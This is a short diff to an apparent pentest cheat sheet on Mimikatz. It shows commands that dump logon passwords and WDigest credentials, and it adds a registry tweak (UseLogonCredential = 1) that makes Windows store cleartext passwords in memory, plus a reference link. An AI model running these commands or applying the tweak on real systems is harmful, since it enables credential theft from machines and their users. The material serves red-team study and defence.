@@ -24,6 +24,10 @@ mimikatz # sekurlsa::wdigest
 ```powershell
 mimikatz_command -f sekurlsa::logonPasswords full
 mimikatz_command -f sekurlsa::wdigest
+
+# to re-enable wdigest in Windows Server 2012+
+# in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest 
+# create a DWORD 'UseLogonCredential' with the value 1.
 ```
 
 ## Mimikatz - Mini Dump
@@ -108,3 +112,4 @@ More informations can be grabbed from the Memory with :
 
 - [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
 - [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
+- [Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH](https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/)
